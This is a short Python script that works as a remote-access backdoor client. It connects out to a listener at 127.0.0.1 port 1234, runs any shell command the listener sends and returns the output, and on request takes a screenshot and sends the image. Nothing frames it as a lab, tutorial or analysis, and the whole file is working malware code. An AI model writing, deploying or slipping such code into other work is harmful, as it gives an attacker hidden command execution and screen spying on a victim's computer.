import socket
import os
import sys
import subprocess
import pyautogui

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect(('127.0.0.1', 1234))

while True:
    cmd = s.recv(1024).decode()
    
    if cmd == 'cmd':
        command = s.recv(1024).decode()
        output = subprocess.getoutput(command)
        if not output or output == '':
            output = 'Command executed'
        s.send(output.encode())
    
    elif cmd == 'screenshot':
        screenshot = pyautogui.screenshot()
        screenshot.save('screenshot.png')
        with open('screenshot.png', 'rb') as f:
            data = f.read()
        s.send(data)
        os.remove('screenshot.png')